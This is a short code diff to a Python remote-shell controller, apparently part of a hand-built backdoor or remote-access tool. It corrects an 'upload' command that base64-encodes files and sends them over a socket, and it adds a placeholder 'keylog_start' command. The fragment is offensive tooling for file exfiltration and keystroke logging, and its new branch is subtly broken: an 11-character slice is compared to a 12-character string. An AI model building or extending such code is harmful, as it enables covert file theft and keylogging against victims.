@@ -31,13 +31,15 @@ def shell():
             with open(command[9:], "wb") as file:
                 file_data = reliable_recv()
                 file.write(base64.b64decode(file_data))
-        elif command[:6] == "uplaod":
+        elif command[:6] == "upload":
             try:
                 with open(command[7:], "rb") as fin:
                     reliable_send(base64.b64encode(fin.read()))
             except:
                 failed = "Failed to uplaod file\n"
                 reliable_send(base64.b64encode(failed))
+        elif command[:11] == "keylog_start":
+            continue
         else:
             result = reliable_recv()
             print(result)
